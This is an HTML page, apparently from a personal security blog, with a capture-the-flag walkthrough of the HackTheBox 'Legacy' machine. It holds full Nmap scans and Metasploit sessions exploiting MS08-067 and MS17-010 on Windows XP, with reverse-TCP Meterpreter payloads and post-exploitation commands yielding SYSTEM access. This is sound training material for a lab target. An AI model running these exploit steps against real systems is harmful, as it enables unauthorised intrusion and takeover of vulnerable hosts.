@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || HackTheBox - legacy</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">HackTheBox - legacy</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="October 15, 2020">
+      Oct 15
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/hackthebox">hackthebox</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/smb">smb</a>
+    <a href="https://shiny-labs.re/tags/cve">cve</a>
+    <a href="https://shiny-labs.re/tags/windows">windows</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="recon">Recon</h1>
+<p>Let&rsquo;s fire Nmap and see if it can find any fun service running on the host! I use an environment variable to store the IP of the machine so I don&rsquo;t have to type it all the time and I don&rsquo;t fat finger and scan the wrong machine (that definitely didn&rsquo;t happen in real life):</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ export TARGET=10.10.10.4
+$ sudo nmap -T4 -p- -oA nmap_tcp $TARGET
+Nmap scan report for 10.10.10.4
+Host is up (0.044s latency).
+Not shown: 65532 filtered ports
+PORT     STATE  SERVICE
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+3389/tcp closed ms-wbt-server
+</code></pre></div><p>This machine looks pretty straight-forward, there&rsquo;s only one service running: Samba. And we also know that it&rsquo;s a Windows machine.</p>
+<p>Before running more recon, tiny table to keep track of services and information about them, that I complete as I find new information:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Vuln?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>139/tcp</td>
+<td>netbios-ssn</td>
+<td>Microsoft Windows netbios-ssn</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>445/tcp</td>
+<td>microsoft-ds</td>
+<td>Windows XP microsoft-ds</td>
+<td>yes</td>
+</tr>
+</tbody>
+</table>
+<h1 id="services">Services</h1>
+<h2 id="139445tcp-smb">139,445/TCP smb</h2>
+<p>Let&rsquo;s run a more precise Nmap scan to see if we can get more information about the OS version and the smb version:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo nmap -sS -A -p 139,445 $TARGET
+Nmap scan report for 10.10.10.4
+Host is up (0.046s latency).
+
+PORT    STATE SERVICE      VERSION
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows XP microsoft-ds
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows XP|2003|2008|2000 (92%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_2000::sp4
+Aggressive OS guesses: Microsoft Windows XP SP3 (92%), Microsoft Windows Server 2003 SP1 or SP2 (90%), Microsoft Windows XP (89%), Microsoft Windows Server 2003 SP2 (89%), Microsoft Windows Server 2008 Enterprise SP2 (88%), Microsoft Windows XP SP2 or Windows Server 2003 (88%), Microsoft Windows 2000 SP4 (88%), Microsoft Windows 2003 SP2 (87%), Microsoft Windows XP SP2 (87%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_clock-skew: mean: 5d00h32m17s, deviation: 2h07m16s, median: 4d23h02m17s
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:c7:e3 (VMware)
+| smb-os-discovery:
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2020-10-20T12:21:23+03:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE (using port 139/tcp)
+HOP RTT      ADDRESS
+1   44.49 ms 10.10.14.1
+2   45.91 ms 10.10.10.4
+</code></pre></div><ul>
+<li>There&rsquo;s a high chance we have a Windows XP in front of us</li>
+<li>I&rsquo;m pretty sure that smb on Windows XP has a bunch of CVEs</li>
+</ul>
+<p>Can we get anything by connecting on the Samba share?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ smbclient -L //10.10.10.4
+Enter WORKGROUP\kali&#39;s password:
+session setup failed: NT_STATUS_INVALID_PARAMETER
+</code></pre></div><p>Apparently not. Nevermind, let&rsquo;s run some Nmap script that targets smb vulnerabilities, you can find the list in <code>/usr/share/nmap/scripts/</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ls /usr/share/nmap/scripts/ | grep &#34;smb-vuln&#34;
+smb-vuln-conficker.nse
+smb-vuln-cve2009-3103.nse
+smb-vuln-cve-2017-7494.nse
+smb-vuln-ms06-025.nse
+smb-vuln-ms07-029.nse
+smb-vuln-ms08-067.nse
+smb-vuln-ms10-054.nse
+smb-vuln-ms10-061.nse
+smb-vuln-ms17-010.nse
+smb-vuln-regsvc-dos.nse
+smb-vuln-webexec.nse
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo nmap -Pn -p445 $TARGET --script=smb-vuln*
+Nmap scan report for 10.10.10.4
+Host is up (0.050s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-cve2009-3103:
+|   VULNERABLE:
+|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2009-3103
+|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
+|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
+|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE
+|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
+|           aka &#34;SMBv2 Negotiation Vulnerability.&#34;
+|
+|     Disclosure date: 2009-09-08
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
+|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
+| smb-vuln-ms08-067:
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds
+</code></pre></div><p>So, we have 3 vulnerabilities to check:</p>
+<ul>
+<li>MS17-010 also known as the infamous EternalBlue</li>
+<li>CVE-2009-3103</li>
+<li>MS08-067 CVE-2008-4250</li>
+</ul>
+<p>For these highly popular vulns, we&rsquo;ll use Metasploit to exploit them, run <code>msfconsole</code> and let&rsquo;s go!</p>
+<h3 id="ms08-067">MS08-067</h3>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; use exploit/windows/smb/ms08_067_netapi
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/ms08_067_netapi) &gt; show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     10.10.14.17      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+msf5 exploit(windows/smb/ms08_067_netapi) &gt; set LHOST 10.10.14.17
+LHOST =&gt; 10.10.14.17
+msf5 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 10.10.10.4
+RHOST =&gt; 10.10.10.4
+msf5 exploit(windows/smb/ms08_067_netapi) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.17:4444
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (176195 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.14.17:4444 -&gt; 10.10.10.4:1031) at 2020-10-14 15:26:00 -0400
+</code></pre></div><p>Yay, we got a Meterpreter shell /o/ You can skip to the Post-Exploitation section for the end of the write-up or stick around to see another way to exploit it.</p>
+<h3 id="ms09-050">MS09-050</h3>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set LHOST 10.10.14.17
+LHOST =&gt; 10.10.14.17
+msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set RHOST 10.10.10.4
+RHOST =&gt; 10.10.10.4
+msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; show options
+
+Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT   445              yes       The target port (TCP)
+   WAIT    180              yes       The number of seconds to wait for the attack to complete.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     10.10.14.17      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Vista SP1/SP2 and Server 2008 (x86)
+
+msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; run
+[*] Started reverse TCP handler on 10.10.14.17:4444
+[*] 10.10.10.4:445 - Connecting to the target (10.10.10.4:445)...
+[*] 10.10.10.4:445 - Sending the exploit packet (938 bytes)...
+[*] 10.10.10.4:445 - Waiting up to 180 seconds for exploit to trigger...
+[*] Exploit completed, but no session was created.
+</code></pre></div><p>No success there, but that exploit was targeted at a more recent OS than our Windows XP:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows Vista SP1/SP2 and Server 2008 (x86)
+</code></pre></div><p>Moving on ~~</p>
+<h3 id="ms17-010">MS17-010</h3>
+<p>No luck with the <code>smb_ms17_010</code> module&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.4
+RHOSTS =&gt; 10.10.10.4
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.17
+LHOST =&gt; 10.10.14.17
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run
+[*] Started reverse TCP handler on 10.10.14.17:4444
+[*] 10.10.10.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1
+[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.10.4:445 - Connecting to target for exploitation.
+[+] 10.10.10.4:445 - Connection established for exploitation.
+[+] 10.10.10.4:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.4:445 - CORE raw buffer dump (11 bytes)
+[*] 10.10.10.4:445 - 0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31                 Windows 5.1
+[+] 10.10.10.4:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.4:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.4:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.4:445 - Starting non-paged pool grooming
+[+] 10.10.10.4:445 - Sending SMBv2 buffers
+[+] 10.10.10.4:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.4:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.4:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.4:445 - Receiving response from exploit packet
+[+] 10.10.10.4:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.4:445 - Sending egg to corrupted connection.
+[*] 10.10.10.4:445 - Triggering free of corrupted buffer.
+[-] 10.10.10.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.10.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.10.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</code></pre></div><p>But <code>windows/smb/ms17_010_psexec</code> on the other hand was more successful!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(windows/smb/ms17_010_psexec) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT                 445                                                             yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBUser                                                                               no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     172.16.149.135   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/smb/ms17_010_psexec) &gt; set LHOST 10.10.14.17
+LHOST =&gt; 10.10.14.17
+msf5 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.4
+RHOSTS =&gt; 10.10.10.4
+msf5 exploit(windows/smb/ms17_010_psexec) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.17:4444
+[*] 10.10.10.4:445 - Target OS: Windows 5.1
+[*] 10.10.10.4:445 - Filling barrel with fish... done
+[*] 10.10.10.4:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
+[*] 10.10.10.4:445 - 	[*] Preparing dynamite...
+[*] 10.10.10.4:445 - 		[*] Trying stick 1 (x86)...Boom!
+[*] 10.10.10.4:445 - 	[+] Successfully Leaked Transaction!
+[*] 10.10.10.4:445 - 	[+] Successfully caught Fish-in-a-barrel
+[*] 10.10.10.4:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
+[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81e95808
+[*] 10.10.10.4:445 - Built a write-what-where primitive...
+[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.10.10.4:445 - Selecting native target
+[*] 10.10.10.4:445 - Uploading payload... BMMJPltk.exe
+[*] 10.10.10.4:445 - Created \BMMJPltk.exe...
+[+] 10.10.10.4:445 - Service started successfully...
+[*] Sending stage (176195 bytes) to 10.10.10.4
+[*] 10.10.10.4:445 - Deleting \BMMJPltk.exe...
+[*] Meterpreter session 2 opened (10.10.14.17:4444 -&gt; 10.10.10.4:1032) at 2020-10-14 15:43:53 -0400
+</code></pre></div><p>And we got a Meterpreter session, awesome!</p>
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<p>I have 0 idea how to check for privileges on Windows XP :&lsquo;D</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; whoami /priv
+[-] Unknown command: whoami.
+</code></pre></div><p>Fortunately for us, meterpreter has a bunch of useful functions to help you! (type <code>help</code> for the whole list):</p>
+<p><code>getuid</code> will fix our lack of <code>whoami</code> command:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre></div><p>Great, we are <code>NT AUTHORITY\SYSTEM</code>!</p>
+<p>And <code>search</code> will get you those flags files:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; search -d / -f *root.txt*
+Found 1 result...
+    \Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; search -f *user.txt*
+Found 1 result...
+    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
+</code></pre></div><p>You can also run an authentic CMD shell:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; shell
+Process 1696 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+</code></pre></div><p>How can you check your privileges from that CMD? You can list the process and their users:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\&gt;tasklist /V
+tasklist /V
+
+Image Name                   PID Session Name     Session#    Mem Usage Status          User Name                                              CPU Time Window Title
+========================= ====== ================ ======== ============ =============== ================================================== ============ ========================================================================
+System Idle Process            0 Console                 0         28 K Running         NT AUTHORITY\SYSTEM                                     0:34:48 N/A
+System                         4 Console                 0        284 K Running         NT AUTHORITY\SYSTEM                                     0:00:06 N/A
+smss.exe                     300 Console                 0        388 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+csrss.exe                    564 Console                 0      3.096 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+winlogon.exe                 656 Console                 0      9.184 K Running         NT AUTHORITY\SYSTEM                                     0:00:02 N/A
+services.exe                 700 Console                 0      4.840 K Running         NT AUTHORITY\SYSTEM                                     0:00:01 N/A
+lsass.exe                    720 Console                 0      5.828 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+svchost.exe                  880 Console                 0      4.532 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+svchost.exe                  956 Console                 0      4.024 K Running         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A
+svchost.exe                 1044 Console                 0     21.316 K Running         NT AUTHORITY\SYSTEM                                     0:00:03 SYSTEM AGENT COM WINDOW
+svchost.exe                 1100 Console                 0      3.372 K Running         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A
+svchost.exe                 1156 Console                 0      4.188 K Running         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A
+logonui.exe                 1232 Console                 0      3.456 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+spoolsv.exe                 1372 Console                 0      4.356 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+VGAuthService.exe           1980 Console                 0      8.912 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+vmtoolsd.exe                 200 Console                 0     13.680 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+alg.exe                      536 Console                 0      3.416 K Running         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A
+wmiprvse.exe                 556 Console                 0      7.984 K Running         NT AUTHORITY\NETWORK SERVICE                            0:00:05 N/A
+logon.scr                    444 Console                 0      1.564 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+rundll32.exe                 404 Console                 0      7.564 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
+cmd.exe                     1696 Console                 0      2.504 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 C:\WINDOWS\system32\cmd.exe - tasklist /V
+tasklist.exe                1612 Console                 0      4.080 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 OleMainThreadWndName
+</code></pre></div><p>Our <code>cmd.exe</code> is owned by <code>NT AUTHORITY\SYSTEM</code> (well, we knew that already but it&rsquo;s always nice to have consistency no?)</p>
+<p>Okay, we are done here, we got 2 ways to root this machine! See you around awesome people!</p>
+<p><img src="img/cat_vs_chicken.gif" alt=""></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#services">Services</a>
+      <ul>
+        <li><a href="#139445tcp-smb">139,445/TCP smb</a>
+          <ul>
+            <li><a href="#ms08-067">MS08-067</a></li>
+            <li><a href="#ms09-050">MS09-050</a></li>
+            <li><a href="#ms17-010">MS17-010</a></li>
+          </ul>
+        </li>
+        <li><a href="#post-exploitation">Post-Exploitation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
